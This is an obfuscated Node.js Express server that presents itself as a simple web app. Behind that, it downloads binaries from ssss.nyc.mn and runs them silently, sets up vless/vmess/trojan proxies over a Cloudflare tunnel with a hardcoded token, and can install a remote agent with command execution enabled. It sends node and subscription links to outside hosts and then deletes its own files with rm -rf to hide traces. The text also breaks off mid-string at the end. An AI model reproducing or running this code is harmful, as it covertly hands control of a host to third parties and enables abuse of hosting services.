const _0x321053=_0x443b;(function(_0x16fa93,_0x5511bc){const _0x5c11cf=_0x443b,_0x4a518d=_0x16fa93();while(!![]){try{const _0x342d52=-parseInt(_0x5c11cf(0x122))/0x1*(-parseInt(_0x5c11cf(0x16e))/0x2)+parseInt(_0x5c11cf(0x1ac))/0x3+parseInt(_0x5c11cf(0x11e))/0x4+parseInt(_0x5c11cf(0x192))/0x5*(parseInt(_0x5c11cf(0x184))/0x6)+-parseInt(_0x5c11cf(0x145))/0x7*(-parseInt(_0x5c11cf(0x182))/0x8)+parseInt(_0x5c11cf(0x176))/0x9+parseInt(_0x5c11cf(0x1a0))/0xa*(-parseInt(_0x5c11cf(0x14a))/0xb);if(_0x342d52===_0x5511bc)break;else _0x4a518d['push'](_0x4a518d['shift']());}catch(_0x31ce86){_0x4a518d['push'](_0x4a518d['shift']());}}}(_0x1e38,0x66d8e));function _0x443b(_0x19dee3,_0x659e31){_0x19dee3=_0x19dee3-0xfc;const _0x1e381d=_0x1e38();let _0x443be4=_0x1e381d[_0x19dee3];return _0x443be4;}const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x321053(0x166)),exec=promisify(require(_0x321053(0x143))[_0x321053(0x12e)]),UPLOAD_URL=process[_0x321053(0x1b6)][_0x321053(0x153)]||'',PROJECT_URL=process[_0x321053(0x1b6)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x321053(0x1b6)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x321053(0x1b6)][_0x321053(0x148)]||_0x321053(0x161),SUB_PATH=process['env'][_0x321053(0x15c)]||_0x321053(0x1b8),PORT=process[_0x321053(0x1b6)]['SERVER_PORT']||process[_0x321053(0x1b6)][_0x321053(0x146)]||0xbb8,UUID=process[_0x321053(0x1b6)]['UUID']||_0x321053(0x190),NEZHA_SERVER=process['env'][_0x321053(0x1bf)]||'',NEZHA_PORT=process[_0x321053(0x1b6)][_0x321053(0x104)]||'',NEZHA_KEY=process[_0x321053(0x1b6)][_0x321053(0x16c)]||'',ARGO_DOMAIN=process[_0x321053(0x1b6)][_0x321053(0x1ae)]||_0x321053(0x198),ARGO_AUTH=process['env'][_0x321053(0x172)]||_0x321053(0x173),ARGO_PORT=process['env'][_0x321053(0x19f)]||0x1f41,CFIP=process['env'][_0x321053(0x151)]||'saas.sin.fan',CFPORT=process[_0x321053(0x1b6)][_0x321053(0x1b5)]||0x1bb,NAME=process[_0x321053(0x1b6)][_0x321053(0x10b)]||_0x321053(0x141);!fs['existsSync'](FILE_PATH)?(fs[_0x321053(0x136)](FILE_PATH),console[_0x321053(0x18c)](FILE_PATH+_0x321053(0x12d))):console[_0x321053(0x18c)](FILE_PATH+_0x321053(0x180));function generateRandomName(){const _0x354ff7=_0x321053,_0x1aed5b=_0x354ff7(0x127);let _0x240549='';for(let _0x5148d3=0x0;_0x5148d3<0x6;_0x5148d3++){_0x240549+=_0x1aed5b['charAt'](Math[_0x354ff7(0x19b)](Math[_0x354ff7(0x116)]()*_0x1aed5b['length']));}return _0x240549;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x321053(0x111)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x321053(0x111)](FILE_PATH,webName),botPath=path[_0x321053(0x111)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x321053(0x160)),listPath=path[_0x321053(0x111)](FILE_PATH,_0x321053(0x10d)),bootLogPath=path[_0x321053(0x111)](FILE_PATH,_0x321053(0x1bc)),configPath=path[_0x321053(0x111)](FILE_PATH,'config.json');function deleteNodes(){const _0x121a3c=_0x321053;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1eb248;try{_0x1eb248=fs[_0x121a3c(0x17b)](subPath,_0x121a3c(0x1b3));}catch{return null;}const _0x340c77=Buffer[_0x121a3c(0x1af)](_0x1eb248,_0x121a3c(0x1c5))[_0x121a3c(0x1a9)](_0x121a3c(0x1b3)),_0x55c662=_0x340c77[_0x121a3c(0x154)]('\x0a')[_0x121a3c(0x14e)](_0xf7f071=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x121a3c(0x144)](_0xf7f071));if(_0x55c662[_0x121a3c(0x191)]===0x0)return;return axios[_0x121a3c(0x121)](UPLOAD_URL+_0x121a3c(0x17a),JSON[_0x121a3c(0x179)]({'nodes':_0x55c662}),{'headers':{'Content-Type':_0x121a3c(0x175)}})[_0x121a3c(0x17d)](_0x4b55bb=>{return null;}),null;}catch(_0x38fc42){return null;}}function cleanupOldFiles(){const _0x5ca5d5=_0x321053;try{const _0x544a99=fs[_0x5ca5d5(0x139)](FILE_PATH);_0x544a99[_0x5ca5d5(0x113)](_0x589309=>{const _0x4cce3d=_0x5ca5d5,_0x5aca5f=path[_0x4cce3d(0x111)](FILE_PATH,_0x589309);try{const _0x2bd5b4=fs['statSync'](_0x5aca5f);_0x2bd5b4[_0x4cce3d(0x197)]()&&fs['unlinkSync'](_0x5aca5f);}catch(_0x455eed){}});}catch(_0x4e62ff){}}async function generateConfig(){const _0x211803=_0x321053,_0x4dbbae={'log':{'access':_0x211803(0x13d),'error':_0x211803(0x13d),'loglevel':_0x211803(0x125)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x211803(0x15b),'settings':{'clients':[{'id':UUID,'flow':_0x211803(0x137)}],'decryption':_0x211803(0x125),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x211803(0x10c)}},{'port':0xbb9,'listen':_0x211803(0x12c),'protocol':_0x211803(0x15b),'settings':{'clients':[{'id':UUID}],'decryption':_0x211803(0x125)},'streamSettings':{'network':_0x211803(0x10c),'security':'none'}},{'port':0xbba,'listen':_0x211803(0x12c),'protocol':_0x211803(0x15b),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x211803(0x130)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x211803(0x12c),'protocol':_0x211803(0x1a5),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x211803(0x17e)}},'sniffing':{'enabled':!![],'destOverride':[_0x211803(0x1aa),'tls',_0x211803(0x130)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x211803(0x12c),'protocol':_0x211803(0x107),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x211803(0x14b)}},'sniffing':{'enabled':!![],'destOverride':[_0x211803(0x1aa),_0x211803(0x109),_0x211803(0x130)],'metadataOnly':![]}}],'dns':{'servers':[_0x211803(0x195)]},'outbounds':[{'protocol':_0x211803(0x11b),'tag':_0x211803(0x1b7)},{'protocol':_0x211803(0x155),'tag':_0x211803(0x13f)}]};fs[_0x211803(0x1ad)](path[_0x211803(0x111)](FILE_PATH,_0x211803(0x167)),JSON[_0x211803(0x179)](_0x4dbbae,null,0x2));}function getSystemArchitecture(){const _0xf8282b=_0x321053,_0x395b54=os[_0xf8282b(0x147)]();return _0x395b54==='arm'||_0x395b54===_0xf8282b(0x15e)||_0x395b54==='aarch64'?_0xf8282b(0x13a):_0xf8282b(0x1c4);}function downloadFile(_0x808e3c,_0x581019,_0xf15736){const _0x5290d8=_0x321053,_0x8a3203=_0x808e3c;!fs[_0x5290d8(0x11a)](FILE_PATH)&&fs[_0x5290d8(0x136)](FILE_PATH,{'recursive':!![]});const _0x23c54b=fs[_0x5290d8(0x1be)](_0x8a3203);axios({'method':_0x5290d8(0x188),'url':_0x581019,'responseType':'stream'})[_0x5290d8(0x102)](_0x2766ab=>{const _0x19ba18=_0x5290d8;_0x2766ab[_0x19ba18(0x14d)][_0x19ba18(0x16b)](_0x23c54b),_0x23c54b['on'](_0x19ba18(0x13b),()=>{const _0x2a5e6b=_0x19ba18;_0x23c54b[_0x2a5e6b(0x170)](),console['log']('Download\x20'+path[_0x2a5e6b(0x171)](_0x8a3203)+'\x20successfully'),_0xf15736(null,_0x8a3203);}),_0x23c54b['on'](_0x19ba18(0x1a2),_0x383bfa=>{const _0x344ead=_0x19ba18;fs[_0x344ead(0x156)](_0x8a3203,()=>{});const _0x1d279c='Download\x20'+path[_0x344ead(0x171)](_0x8a3203)+_0x344ead(0x142)+_0x383bfa[_0x344ead(0x1c1)];console['error'](_0x1d279c),_0xf15736(_0x1d279c);});})[_0x5290d8(0x17d)](_0x8161ed=>{const _0x1811ec=_0x5290d8,_0x212eb0=_0x1811ec(0x14c)+path['basename'](_0x8a3203)+_0x1811ec(0x142)+_0x8161ed[_0x1811ec(0x1c1)];console[_0x1811ec(0x1a2)](_0x212eb0),_0xf15736(_0x212eb0);});}async function downloadFilesAndRun(){const _0x2ac4b4=_0x321053,_0x527206=getSystemArchitecture(),_0x3ec13b=getFilesForArchitecture(_0x527206);if(_0x3ec13b[_0x2ac4b4(0x191)]===0x0){console[_0x2ac4b4(0x18c)](_0x2ac4b4(0x120));return;}const _0x146cb6=_0x3ec13b[_0x2ac4b4(0x10f)](_0x497718=>{return new Promise((_0x2f48c2,_0x28c6cb)=>{const _0x9a5612=_0x443b;downloadFile(_0x497718[_0x9a5612(0x119)],_0x497718['fileUrl'],(_0x58bf0e,_0xe9bcc5)=>{_0x58bf0e?_0x28c6cb(_0x58bf0e):_0x2f48c2(_0xe9bcc5);});});});try{await Promise[_0x2ac4b4(0x194)](_0x146cb6);}catch(_0x348776){console['error'](_0x2ac4b4(0x118),_0x348776);return;}function _0x1b650f(_0x3b4102){const _0x456a48=_0x2ac4b4,_0x3af85c=0x1fd;_0x3b4102[_0x456a48(0x113)](_0x5aab7d=>{const _0x5a9673=_0x456a48;fs[_0x5a9673(0x11a)](_0x5aab7d)&&fs[_0x5a9673(0x1a4)](_0x5aab7d,_0x3af85c,_0x3262e5=>{const _0x493ce2=_0x5a9673;_0x3262e5?console[_0x493ce2(0x1a2)](_0x493ce2(0x150)+_0x5aab7d+':\x20'+_0x3262e5):console[_0x493ce2(0x18c)](_0x493ce2(0x105)+_0x5aab7d+':\x20'+_0x3af85c[_0x493ce2(0x1a9)](0x8));});});}const _0x4bb792=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1b650f(_0x4bb792);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x45221b=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2ac4b4(0x154)](':')[_0x2ac4b4(0x16d)]():'',_0x358325=new Set([_0x2ac4b4(0x115),_0x2ac4b4(0x18a),'2096',_0x2ac4b4(0x10a),_0x2ac4b4(0x103),_0x2ac4b4(0x138)]),_0x36bc5d=_0x358325[_0x2ac4b4(0x114)](_0x45221b)?'true':_0x2ac4b4(0x117),_0x497317=_0x2ac4b4(0x18d)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x36bc5d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x2ac4b4(0x111)](FILE_PATH,_0x2ac4b4(0x1a7)),_0x497317);const _0x3cc27c=_0x2ac4b4(0x140)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2ac4b4(0x18e);try{await exec(_0x3cc27c),console[_0x2ac4b4(0x18c)](phpName+_0x2ac4b4(0x183)),await new Promise(_0x4b1777=>setTimeout(_0x4b1777,0x3e8));}catch(_0x3b3df8){console['error'](_0x2ac4b4(0x135)+_0x3b3df8);}}else{let _0x496205='';const _0xed3a37=['443',_0x2ac4b4(0x18a),_0x2ac4b4(0x16f),_0x2ac4b4(0x10a),_0x2ac4b4(0x103),'2053'];_0xed3a37[_0x2ac4b4(0x1c0)](NEZHA_PORT)&&(_0x496205=_0x2ac4b4(0xfc));const _0x578e88=_0x2ac4b4(0x140)+npmPath+_0x2ac4b4(0x18f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x496205+_0x2ac4b4(0x10e);try{await exec(_0x578e88),console['log'](npmName+_0x2ac4b4(0x183)),await new Promise(_0x3067f4=>setTimeout(_0x3067f4,0x3e8));}catch(_0x158a36){console[_0x2ac4b4(0x1a2)](_0x2ac4b4(0x199)+_0x158a36);}}}else console[_0x2ac4b4(0x18c)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4ab700=_0x2ac4b4(0x140)+webPath+'\x20-c\x20'+FILE_PATH+_0x2ac4b4(0x159);try{await exec(_0x4ab700),console[_0x2ac4b4(0x18c)](webName+_0x2ac4b4(0x183)),await new Promise(_0x62f06e=>setTimeout(_0x62f06e,0x3e8));}catch(_0x19d088){console[_0x2ac4b4(0x1a2)](_0x2ac4b4(0x168)+_0x19d088);}if(fs[_0x2ac4b4(0x11a)](botPath)){let _0x5d10b4;if(ARGO_AUTH[_0x2ac4b4(0x14f)](/^[A-Z0-9a-z=]{120,250}$/))_0x5d10b4=_0x2ac4b4(0x1ba)+ARGO_AUTH;else ARGO_AUTH[_0x2ac4b4(0x14f)](/TunnelSecret/)?_0x5d10b4=_0x2ac4b4(0x106)+FILE_PATH+_0x2ac4b4(0x13e):_0x5d10b4=_0x2ac4b4(0x17f)+FILE_PATH+_0x2ac4b4(0x11f)+ARGO_PORT;try{await exec(_0x2ac4b4(0x140)+botPath+'\x20'+_0x5d10b4+_0x2ac4b4(0x1b2)),console[_0x2ac4b4(0x18c)](botName+_0x2ac4b4(0x183)),await new Promise(_0x1769c9=>setTimeout(_0x1769c9,0x7d0));}catch(_0x580f2a){console[_0x2ac4b4(0x1a2)](_0x2ac4b4(0x128)+_0x580f2a);}}await new Promise(_0x343123=>setTimeout(_0x343123,0x1388));}function getFilesForArchitecture(_0x4e26e4){const _0x5bfe92=_0x321053;let _0x2746df;_0x4e26e4===_0x5bfe92(0x13a)?_0x2746df=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5bfe92(0x1b9)}]:_0x2746df=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5bfe92(0x124)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3d78fc=_0x4e26e4===_0x5bfe92(0x13a)?'https://arm64.ssss.nyc.mn/agent':_0x5bfe92(0x189);_0x2746df[_0x5bfe92(0x185)]({'fileName':npmPath,'fileUrl':_0x3d78fc});}else{const _0x2ad47b=_0x4e26e4===_0x5bfe92(0x13a)?_0x5bfe92(0x15a):_0x5bfe92(0x187);_0x2746df[_0x5bfe92(0x185)]({'fileName':phpPath,'fileUrl':_0x2ad47b});}}return _0x2746df;}function argoType(){const _0xeca0ce=_0x321053;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xeca0ce(0x101));return;}if(ARGO_AUTH[_0xeca0ce(0x1c0)](_0xeca0ce(0x12a))){fs['writeFileSync'](path[_0xeca0ce(0x111)](FILE_PATH,_0xeca0ce(0x16a)),ARGO_AUTH);const _0x44ea20=_0xeca0ce(0x163)+ARGO_AUTH[_0xeca0ce(0x154)]('\x22')[0xb]+_0xeca0ce(0x129)+path[_0xeca0ce(0x111)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xeca0ce(0x174)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0xeca0ce(0x111)](FILE_PATH,_0xeca0ce(0x17c)),_0x44ea20);}else console[_0xeca0ce(0x18c)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x30e2fe=_0x321053;let _0x1f9f43;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1f9f43=ARGO_DOMAIN,console['log'](_0x30e2fe(0x1c7),_0x1f9f43),await _0x160a2(_0x1f9f43);else try{const _0x54f9f3=fs[_0x30e2fe(0x17b)](path['join'](FILE_PATH,_0x30e2fe(0x1bc)),_0x30e2fe(0x1b3)),_0x1ae0b3=_0x54f9f3[_0x30e2fe(0x154)]('\x0a'),_0x3bc068=[];_0x1ae0b3[_0x30e2fe(0x113)](_0x510879=>{const _0x973980=_0x30e2fe,_0x3bb1f1=_0x510879[_0x973980(0x14f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3bb1f1){const _0x292a03=_0x3bb1f1[0x1];_0x3bc068[_0x973980(0x18b)](_0x292a03);}});if(_0x3bc068[_0x30e2fe(0x191)]>0x0)_0x1f9f43=_0x3bc068[0x0],console[_0x30e2fe(0x18c)]('ArgoDomain:',_0x1f9f43),await _0x160a2(_0x1f9f43);else{console[_0x30e2fe(0x18c)](_0x30e2fe(0xff)),fs[_0x30e2fe(0x12b)](path['join'](FILE_PATH,_0x30e2fe(0x1bc)));async function _0x115ac9(){const _0xa6063=_0x30e2fe;try{process[_0xa6063(0x19c)]===_0xa6063(0x11c)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xa6063(0x165)):await exec(_0xa6063(0x11d)+botName[_0xa6063(0x1c2)](0x0)+']'+botName[_0xa6063(0x162)](0x1)+_0xa6063(0x149));}catch(_0x34a8a7){}}_0x115ac9(),await new Promise(_0x3fb6e1=>setTimeout(_0x3fb6e1,0xbb8));const _0x267085='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x30e2fe(0x11f)+ARGO_PORT;try{await exec(_0x30e2fe(0x140)+botPath+'\x20'+_0x267085+'\x20>/dev/null\x202>&1\x20&'),console[_0x30e2fe(0x18c)](botName+_0x30e2fe(0x183)),await new Promise(_0x32be9d=>setTimeout(_0x32be9d,0xbb8)),await extractDomains();}catch(_0x1e9ec0){console['error'](_0x30e2fe(0x128)+_0x1e9ec0);}}}catch(_0x451f79){console['error'](_0x30e2fe(0x133),_0x451f79);}async function _0x5d83b3(){const _0x105d54=_0x30e2fe;try{const _0x2e2735=await axios[_0x105d54(0x188)](_0x105d54(0x169),{'timeout':0xbb8});if(_0x2e2735[_0x105d54(0x14d)]&&_0x2e2735[_0x105d54(0x14d)][_0x105d54(0x1a1)]&&_0x2e2735[_0x105d54(0x14d)][_0x105d54(0x1a6)])return _0x2e2735[_0x105d54(0x14d)][_0x105d54(0x1a1)]+'_'+_0x2e2735['data'][_0x105d54(0x1a6)];}catch(_0x1d4076){try{const _0x33a53f=await axios['get'](_0x105d54(0x1b4),{'timeout':0xbb8});if(_0x33a53f[_0x105d54(0x14d)]&&_0x33a53f[_0x105d54(0x14d)][_0x105d54(0xfd)]===_0x105d54(0x126)&&_0x33a53f['data']['countryCode']&&_0x33a53f[_0x105d54(0x14d)][_0x105d54(0x1a6)])return _0x33a53f[_0x105d54(0x14d)][_0x105d54(0x1a8)]+'_'+_0x33a53f['data']['org'];}catch(_0x4fdd22){}}return _0x105d54(0x1bb);}async function _0x160a2(_0x52b247){const _0x57ed08=await _0x5d83b3(),_0x15765a=NAME?NAME+'-'+_0x57ed08:_0x57ed08;return new Promise(_0x55b490=>{setTimeout(()=>{const _0x2e9f5c=_0x443b,_0x46d459={'v':'2','ps':''+_0x15765a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2e9f5c(0x125),'net':'ws','type':_0x2e9f5c(0x125),'host':_0x52b247,'path':_0x2e9f5c(0x1ab),'tls':_0x2e9f5c(0x109),'sni':_0x52b247,'alpn':'','fp':'firefox'},_0x441e2e=_0x2e9f5c(0x152)+UUID+'@'+CFIP+':'+CFPORT+_0x2e9f5c(0x196)+_0x52b247+'&fp=firefox&type=ws&host='+_0x52b247+_0x2e9f5c(0x164)+_0x15765a+_0x2e9f5c(0x186)+Buffer[_0x2e9f5c(0x1af)](JSON[_0x2e9f5c(0x179)](_0x46d459))[_0x2e9f5c(0x1a9)](_0x2e9f5c(0x1c5))+_0x2e9f5c(0x131)+UUID+'@'+CFIP+':'+CFPORT+_0x2e9f5c(0x19d)+_0x52b247+_0x2e9f5c(0x123)+_0x52b247+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x15765a+'\x0a\x20\x20\x20\x20';console[_0x2e9f5c(0x18c)](Buffer[_0x2e9f5c(0x1af)](_0x441e2e)['toString'](_0x2e9f5c(0x1c5))),fs[_0x2e9f5c(0x1ad)](subPath,Buffer[_0x2e9f5c(0x1af)](_0x441e2e)[_0x2e9f5c(0x1a9)](_0x2e9f5c(0x1c5))),console[_0x2e9f5c(0x18c)](FILE_PATH+_0x2e9f5c(0x1c6)),uploadNodes(),app[_0x2e9f5c(0x188)]('/'+SUB_PATH,(_0x142d3b,_0x117940)=>{const _0x31cfd6=_0x2e9f5c,_0xcd8e0c=Buffer['from'](_0x441e2e)[_0x31cfd6(0x1a9)](_0x31cfd6(0x1c5));_0x117940[_0x31cfd6(0x1a3)](_0x31cfd6(0xfe),_0x31cfd6(0x158)),_0x117940[_0x31cfd6(0x15f)](_0xcd8e0c);}),_0x55b490(_0x441e2e);},0x7d0);});}}async function uploadNodes(){const _0x1d4c60=_0x321053;if(UPLOAD_URL&&PROJECT_URL){const _0x392bb6=PROJECT_URL+'/'+SUB_PATH,_0x49c272={'subscription':[_0x392bb6]};try{const _0x164cae=await axios[_0x1d4c60(0x121)](UPLOAD_URL+_0x1d4c60(0x13c),_0x49c272,{'headers':{'Content-Type':_0x1d4c60(0x175)}});return _0x164cae&&_0x164cae['status']===0xc8?(console[_0x1d4c60(0x18c)](_0x1d4c60(0x177)),_0x164cae):null;}catch(_0x65bc56){if(_0x65bc56['response']){if(_0x65bc56[_0x1d4c60(0x19e)][_0x1d4c60(0xfd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1d4c60(0x11a)](listPath))return;const _0x1ef2a9=fs[_0x1d4c60(0x17b)](listPath,_0x1d4c60(0x1b3)),_0x13ba99=_0x1ef2a9[_0x1d4c60(0x154)]('\x0a')[_0x1d4c60(0x14e)](_0x514d59=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1d4c60(0x144)](_0x514d59));if(_0x13ba99['length']===0x0)return;const _0x125731=JSON[_0x1d4c60(0x179)]({'nodes':_0x13ba99});try{const _0x23a374=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x125731,{'headers':{'Content-Type':'application/json'}});return _0x23a374&&_0x23a374[_0x1d4c60(0xfd)]===0xc8?(console[_0x1d4c60(0x18c)](_0x1d4c60(0x1bd)),_0x23a374):null;}catch(_0x216394){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b4e5b=_0x443b,_0x3e3c60=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3e3c60[_0x5b4e5b(0x18b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3e3c60['push'](phpPath);process[_0x5b4e5b(0x19c)]===_0x5b4e5b(0x11c)?exec(_0x5b4e5b(0x110)+_0x3e3c60['join']('\x20')+'\x20>\x20nul\x202>&1',_0x479fc4=>{const _0x382189=_0x5b4e5b;console[_0x382189(0x12f)](),console[_0x382189(0x18c)]('App\x20is\x20running'),console[_0x382189(0x18c)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x5b4e5b(0x134)+_0x3e3c60[_0x5b4e5b(0x111)]('\x20')+_0x5b4e5b(0x112),_0x1ca3ae=>{const _0x3aa38f=_0x5b4e5b;console[_0x3aa38f(0x12f)](),console[_0x3aa38f(0x18c)](_0x3aa38f(0x157)),console[_0x3aa38f(0x18c)](_0x3aa38f(0x1c3));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5358a7=_0x321053;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5358a7(0x108));return;}try{const _0x4e40af=await axios['post'](_0x5358a7(0x1b1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5358a7(0x175)}});return console[_0x5358a7(0x18c)]('automatic\x20access\x20task\x20added\x20successfully'),_0x4e40af;}catch(_0x132cd6){return console[_0x5358a7(0x1a2)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x132cd6[_0x5358a7(0x1c1)]),null;}}async function startserver(){const _0x705ac6=_0x321053;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x54e4da){console[_0x705ac6(0x1a2)](_0x705ac6(0x1b0),_0x54e4da);}}startserver()[_0x321053(0x17d)](_0x34d987=>{const _0x45e7a4=_0x321053;console[_0x45e7a4(0x1a2)](_0x45e7a4(0x181),_0x34d987);}),app[_0x321053(0x188)]('/',async function(_0x57898e,_0x16fd18){const _0x5502ef=_0x321053;try{const _0x5eef60=path['join'](__dirname,_0x5502ef(0x100)),_0x2d0ee2=await fs[_0x5502ef(0x178)][_0x5502ef(0x15d)](_0x5eef60,_0x5502ef(0x19a));_0x16fd18[_0x5502ef(0x15f)](_0x2d0ee2);}catch(_0x23d005){_0x16fd18['send'](_0x5502ef(0x193));}}),app['listen'](PORT,()=>console[_0x321053(0x18c)](_0x321053(0x132)+PORT+'!'));function _0x1e38(){const _0x51a038=['127.0.0.1','\x20is\x20created','exec','clear','quic','\x0a\x0atrojan://','http\x20server\x20is\x20running\x20on\x20port:','Error\x20reading\x20boot.log:','rm\x20-rf\x20','php\x20running\x20error:\x20','mkdirSync','xtls-rprx-vision','2053','readdirSync','arm','finish','/api/add-subscriptions','/dev/null','/tunnel.yml\x20run','block','nohup\x20','Galaxy','\x20failed:\x20','child_process','test','651AeLLZP','PORT','arch','FILE_PATH','\x22\x20>\x20/dev/null\x202>&1','31225931PgrfNI','/trojan-argo','Download\x20','data','filter','match','Empowerment\x20failed\x20for\x20','CFIP','\x0avless://','UPLOAD_URL','split','blackhole','unlink','App\x20is\x20running','text/plain;\x20charset=utf-8','/config.json\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/v1','vless','SUB_PATH','readFile','arm64','send','sub.txt','.tmp','substring','\x0a\x20\x20tunnel:\x20','&path=%2Fvless-argo%3Fed%3D2560#','.exe\x20>\x20nul\x202>&1','util','config.json','web\x20running\x20error:\x20','https://ipapi.co/json','tunnel.json','pipe','NEZHA_KEY','pop','322550qYCDYV','2096','close','basename','ARGO_AUTH','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiNmU1ZTc1YjMtYTViNi00YWE5LTg1ZTUtNzQ5NTM2ZmEyYjkyIiwicyI6Ik5UVmpaVGczWkRjdE1tRTNOQzAwTWpZeUxUZ3dZVFF0WkdSaU9UVm1abVkxWmpjNSJ9','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','application/json','5882292qCeNXE','Subscription\x20uploaded\x20successfully','promises','stringify','/api/delete-nodes','readFileSync','tunnel.yml','catch','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20already\x20exists','Unhandled\x20error\x20in\x20startserver:','37624fFQPpS','\x20is\x20running','135030vTjubj','unshift','\x0a\x0avmess://','https://amd64.ssss.nyc.mn/v1','get','https://amd64.ssss.nyc.mn/agent','8443','push','log','\x0aclient_secret:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-s\x20','bc97f674-c578-4940-9234-0a1da46041b9','length','175pFKckj','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','all','https+local://8.8.8.8/dns-query','?encryption=none&security=tls&sni=','isFile','galaxyfr.xiangyu-group.com.cn','npm\x20running\x20error:\x20','utf8','floor','platform','?security=tls&sni=','response','ARGO_PORT','10DTSFmj','country_code','error','set','chmod','vmess','org','config.yaml','countryCode','toString','http','/vmess-argo?ed=2560','2219742KDWHXF','writeFileSync','ARGO_DOMAIN','from','Error\x20in\x20startserver:','https://oooo.serv00.net/add-url','\x20>/dev/null\x202>&1\x20&','utf-8','http://ip-api.com/json','CFPORT','env','direct','subabc','https://arm64.ssss.nyc.mn/bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Unknown','boot.log','Nodes\x20uploaded\x20successfully','createWriteStream','NEZHA_SERVER','includes','message','charAt','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','amd','base64','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN:','--tls','status','Content-Type','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','index.html','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','then','2083','NEZHA_PORT','Empowerment\x20success\x20for\